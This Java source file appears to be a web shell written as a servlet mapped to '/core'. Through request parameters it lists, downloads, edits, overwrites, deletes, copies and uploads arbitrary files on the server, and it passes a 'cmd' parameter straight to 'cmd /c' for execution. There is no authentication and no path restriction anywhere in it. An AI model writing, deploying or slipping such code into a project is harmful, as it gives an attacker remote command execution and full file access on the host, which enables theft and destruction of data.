package org.zl.jf;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.Date;
import java.util.Hashtable;

import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet implementation class CoreServlet
 */
@WebServlet("/core")
public class CoreServlet extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public CoreServlet() {
        super();
        // TODO Auto-generated constructor stub
    }

	/**
	 * @see Servlet#init(ServletConfig)
	 */
	public void init(ServletConfig config) throws ServletException {
		// TODO Auto-generated method stub
	}

	/**
	 * @see Servlet#destroy()
	 */
	public void destroy() {
		// TODO Auto-generated method stub
	}

	/**
	 * @see Servlet#getServletConfig()
	 */
	public ServletConfig getServletConfig() {
		// TODO Auto-generated method stub
		return null;
	}

	/**
	 * @see HttpServlet#service(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		// TODO Auto-generated method stub
		

		request.setCharacterEncoding("gb2312");
		String tabID = request.getParameter("tabID");
		String strDir = request.getParameter("path");
		String strAction = request.getParameter("action");
		String strFile = request.getParameter("file");
		String strPath = strDir + "\\" + strFile; 
		String strCmd = request.getParameter("cmd");
		StringBuffer sbEdit=new StringBuffer("");
		StringBuffer sbDown=new StringBuffer("");
		StringBuffer sbCopy=new StringBuffer("");
		StringBuffer sbSaveCopy=new StringBuffer("");
		StringBuffer sbNewFile=new StringBuffer("");
		
		PrintWriter writer = response.getWriter();
		response.getOutputStream();
		if((tabID==null) || tabID.equals(""))
		{
			tabID = "1";
		}
		
		if(strDir==null||strDir.length()<1)
		{
			strDir = request.getRealPath("/");
		}
		
		
		if(strAction!=null && strAction.equals("down"))
		{
			File f=new File(strPath);
			if(f.length()==0)
			{
				sbDown.append("文件大小为 0 字节，就不用下了吧");
			}
			else
			{
				response.setHeader("content-type","text/html; charset=ISO-8859-1");
				response.setContentType("APPLICATION/OCTET-STREAM");	
				response.setHeader("Content-Disposition","attachment; filename=\""+f.getName()+"\"");
				FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());
				OutputStream out = new BufferedOutputStream(response.getOutputStream());
//				out.clearBuffer();
				int i;
				while ((i=fileInputStream.read()) != -1)
				{
					out.write(i);	
				}
				fileInputStream.close();
				out.close();
			}
		}
		
		if(strAction!=null && strAction.equals("del"))
		{
			File f=new File(strPath);
			f.delete();
		}
		
		if(strAction!=null && strAction.equals("edit"))
		{
			File f=new File(strPath);	
			BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f)));
			sbEdit.append("<form name='frmEdit' action='' method='POST'>\r\n");
			sbEdit.append("<input type=hidden name=action value=save >\r\n");
			sbEdit.append("<input type=hidden name=path value='"+strDir+"' >\r\n");
			sbEdit.append("<input type=hidden name=file value='"+strFile+"' >\r\n");
			sbEdit.append("<input type=submit name=save value=' "+CommonUtil.strFileSave[0]+" '> ");
			sbEdit.append("<input type=button name=goback value=' "+CommonUtil.strBack[CommonUtil.languageNo]+" ' onclick='history.back(-1);'> &nbsp;"+strPath+"\r\n");
			sbEdit.append("<br><textarea rows=30 cols=90 name=content>");
			String line="";
			while((line=br.readLine())!=null)
			{
				sbEdit.append(CommonUtil.htmlEncode(line)+"\r\n");		
			}
		   sbEdit.append("</textarea>");
			sbEdit.append("<input type=hidden name=path value="+strDir+">");
			sbEdit.append("</form>");
		}
		
		if(strAction!=null && strAction.equals("save"))
		{
			File f=new File(strPath);
			BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));
			String strContent=request.getParameter("content");
			bw.write(strContent);
			bw.close();
		}
		if(strAction!=null && strAction.equals("copy"))
		{
			File f=new File(strPath);
			sbCopy.append("<br><form name='frmCopy' action='' method='POST'>\r\n");
			sbCopy.append("<input type=hidden name=action value=savecopy >\r\n");
			sbCopy.append("<input type=hidden name=path value='"+strDir+"' >\r\n");
			sbCopy.append("<input type=hidden name=file value='"+strFile+"' >\r\n");
			sbCopy.append("原始文件： "+strPath+"<p>");
			sbCopy.append("目标文件： <input type=text name=file2 size=40 value='"+strDir+"'><p>");
			sbCopy.append("<input type=submit name=save value=' "+CommonUtil.strFileCopy[CommonUtil.languageNo]+" '> ");
			sbCopy.append("<input type=button name=goback value=' "+CommonUtil.strBack[CommonUtil.languageNo]+" ' onclick='history.back(-1);'> <p>&nbsp;\r\n");
			sbCopy.append("</form>");
		}
		if(strAction!=null && strAction.equals("savecopy"))
		{
			File f=new File(strPath);
			String strDesFile=request.getParameter("file2");
			if(strDesFile==null || strDesFile.equals(""))
			{
				sbSaveCopy.append("<p><font color=red>目标文件错误。</font>");
			}
			else
			{
				File f_des=new File(strDesFile);
				if(f_des.isFile())
				{
					sbSaveCopy.append("<p><font color=red>目标文件已存在,不能复制。</font>");
				}
				else
				{
					String strTmpFile=strDesFile;
					if(f_des.isDirectory())
					{
						if(!strDesFile.endsWith("\\"))
						{
							strDesFile=strDesFile+"\\";
						}
						strTmpFile=strDesFile+"cqq_"+strFile;
					 }
					
					File f_des_copy=new File(strTmpFile);
					FileInputStream in1=new FileInputStream(f);
					FileOutputStream out1=new FileOutputStream(f_des_copy);
					byte[] buffer=new byte[1024];
					int c;
					while((c=in1.read(buffer))!=-1)
					{
						out1.write(buffer,0,c);
					}
					in1.close();
					out1.close();
			
					sbSaveCopy.append("原始文件 ："+strPath+"<p>");
					sbSaveCopy.append("目标文件 ："+strTmpFile+"<p>");
					sbSaveCopy.append("<font color=red>复制成功！</font>");			
				}		
			}	
			sbSaveCopy.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=返回>");
		}
		if(strAction!=null && strAction.equals("newFile"))
		{
			String strF=request.getParameter("fileName");
			String strType1=request.getParameter("btnNewFile");
			String strType2=request.getParameter("btnNewDir");
			String strType="";
			if(strType1==null)
			{
				strType="Dir";
			}
			else if(strType2==null)
			{
				strType="File";
			}
			if(!strType.equals("") && !(strF==null || strF.equals("")))
			{		
					File f_new=new File(strF);			
					if(strType.equals("File") && !f_new.createNewFile())
						sbNewFile.append(strF+" 文件创建失败");
					if(strType.equals("Dir") && !f_new.mkdirs())
						sbNewFile.append(strF+" 目录创建失败");
			}
			else
			{
				sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
			}
		}
		
		if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith("multipart")))
		{
			String tempdir=".";
			boolean error=false;
			response.setContentType("text/html");
			sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
			HttpMultiPartParser parser = new HttpMultiPartParser();
		
			int bstart = request.getContentType().lastIndexOf("oundary=");
			String bound = request.getContentType().substring(bstart + 8);
			int clength = request.getContentLength();
			Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);
			if (ht.get("cqqUploadFile") != null)
			{
		
				FileInfo fi = (FileInfo) ht.get("cqqUploadFile");
				File f1 = fi.file;
				UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
				if (info != null && info.aborted) 
				{
					f1.delete();
					request.setAttribute("error", "Upload aborted");
				}
				else 
				{
					String path = (String) ht.get("path");
					if(path!=null && !path.endsWith("\\")) 
						path = path + "\\";
					if (!f1.renameTo(new File(path + f1.getName()))) 
					{
						request.setAttribute("error", "Cannot upload file.");
						error = true;
						f1.delete();
					}
				}
			}
		}


		StringBuffer sbFolder=new StringBuffer("");
		StringBuffer sbFile=new StringBuffer("");
		try
		{
			File objFile = new File(strDir);
			File list[] = objFile.listFiles();	
			if(objFile.getAbsolutePath().length()>3)
			{
				sbFolder.append("<tr><td >&nbsp;</td><td><a href=\"javascript:doForm('','"+CommonUtil.formatPath(objFile.getParentFile().getAbsolutePath())+"','','"+strCmd+"','1','');\">");
				sbFolder.append(CommonUtil.strParentFolder[CommonUtil.languageNo]+"</a><br>- - - - - - - - - - - </td></tr>\r\n ");
		
		
			}
			for(int i=0;i<list.length;i++)
			{
				if(list[i].isDirectory())
				{
					sbFolder.append("<tr><td >&nbsp;</td><td>");
					sbFolder.append("  <a href=\"javascript:doForm('','"+CommonUtil.formatPath(list[i].getAbsolutePath())+"','','"+strCmd+"','1','');\">");
					sbFolder.append(list[i].getName()+"</a><br></td></tr> ");
				}
				else
				{
				    String strLen="";
					String strDT="";
					long lFile=0;
					lFile=list[i].length();
					strLen = CommonUtil.convertFileSize(lFile);
					Date dt=new Date(list[i].lastModified());
					strDT=dt.toLocaleString();
					sbFile.append("<tr onmouseover=\"this.style.backgroundColor='#FBFFC6'\" onmouseout=\"this.style.backgroundColor='white'\"><td>");
					sbFile.append(""+list[i].getName());	
					sbFile.append("</td><td>");
					sbFile.append(""+strLen);
					sbFile.append("</td><td>");
					sbFile.append(""+strDT);
					sbFile.append("</td><td>");
		
					sbFile.append(" &nbsp;<a href=\"javascript:doForm('edit','"+CommonUtil.formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
					sbFile.append(CommonUtil.strFileEdit[CommonUtil.languageNo]+"</a> ");
		
					sbFile.append(" &nbsp;<a href=\"javascript:doForm('del','"+CommonUtil.formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
					sbFile.append(CommonUtil.strFileDel[CommonUtil.languageNo]+"</a> ");
		
					sbFile.append("  &nbsp;<a href=\"javascript:doForm('down','"+CommonUtil.formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
					sbFile.append(CommonUtil.strFileDown[CommonUtil.languageNo]+"</a> ");
		
					sbFile.append("  &nbsp;<a href=\"javascript:doForm('copy','"+CommonUtil.formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
					sbFile.append(CommonUtil.strFileCopy[CommonUtil.languageNo]+"</a> ");
				}		
		
			}	
		}
		catch(Exception e)
		{
			writer.println("<font color=red>操作失败： "+e.toString()+"</font>");
		}
		String line="";
		StringBuffer sbCmd=new StringBuffer("");

		if(strCmd!=null) 
		{
			try
			{
				//out.println(strCmd);
				Process p=Runtime.getRuntime().exec("cmd /c "+strCmd);
				BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
				while((line=br.readLine())!=null)
				{
					sbCmd.append(line+"\r\n");		
				}    
			}
			catch(Exception e)
			{
				System.out.println(e.toString());
			}
		}
		else
		{
			strCmd = "set";
		}

	}


}
